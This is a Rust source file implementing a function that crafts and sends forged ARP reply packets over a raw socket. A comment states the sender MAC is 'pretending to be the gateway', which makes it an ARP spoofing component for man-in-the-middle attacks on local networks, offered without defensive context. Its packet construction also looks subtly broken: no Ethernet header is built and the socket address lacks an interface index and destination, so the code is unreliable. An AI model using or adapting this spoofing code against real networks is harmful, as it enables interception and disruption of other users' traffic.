use std::ffi::CString;
use std::mem;
use std::net::Ipv4Addr;
use libc::{htons, sendto, sockaddr_ll, socket, AF_PACKET, ETH_P_ARP};
use crate::SOCK_RAW;

#[repr(C, packed)]
struct ArpPacket {
    htype: u16,
    ptype: u16,
    hlen: u8,
    plen: u8,
    oper: u16,
    sha: [u8; 6], // Source MAC
    spa: [u8; 4], // Source IP
    tha: [u8; 6], // Target MAC
    tpa: [u8; 4], // Target IP
}

pub fn send_arp_reply(interface: &str, target_mac: [u8; 6], target_ip: Ipv4Addr, sender_ip: Ipv4Addr, sender_mac: [u8; 6]) {
    // Create raw socket
    let sock = unsafe { socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP as u16) as i32) };
    if sock < 0 {
        eprintln!("Error creating socket");
        return;
    }

    // Bind the socket to the specified network interface
    let interface_cstr = CString::new(interface).expect("CString::new failed");
    let interface_ptr = interface_cstr.as_ptr();
    let result = unsafe {
        libc::setsockopt(
            sock,
            libc::SOL_SOCKET,
            libc::SO_BINDTODEVICE,
            interface_ptr as *const libc::c_void,
            interface_cstr.to_bytes().len() as u32,
        )
    };
    if result != 0 {
        eprintln!("Error binding socket to interface");
        unsafe { libc::close(sock) };
        return;
    }

    let mut sockaddr: sockaddr_ll = unsafe { std::mem::zeroed() };
    sockaddr.sll_family = AF_PACKET as u16;
    sockaddr.sll_protocol = htons(ETH_P_ARP as u16);

    // Construct the ARP reply packet
    let arp_reply = ArpPacket {
        htype: htons(1),    // Ethernet
        ptype: htons(0x0800), // IPv4
        hlen: 6,
        plen: 4,
        oper: htons(2),      // ARP Reply
        sha: sender_mac,     // Your MAC (pretending to be the gateway)
        spa: sender_ip.octets(),
        tha: target_mac,     // Target MAC (the machine that sent the ARP request)
        tpa: target_ip.octets(), // Target IP
    };

    // Send the ARP reply
    unsafe {
        let sent_len = sendto(
            sock,
            &arp_reply as *const _ as *const libc::c_void,
            mem::size_of::<ArpPacket>(),
            0,
            &sockaddr as *const sockaddr_ll as *const _,
            mem::size_of::<sockaddr_ll>() as u32,
        );

        if sent_len < 0 {
            eprintln!("Error sending ARP reply");
        }
    }

    // Close the socket
    unsafe {
        libc::close(sock);
    }
}
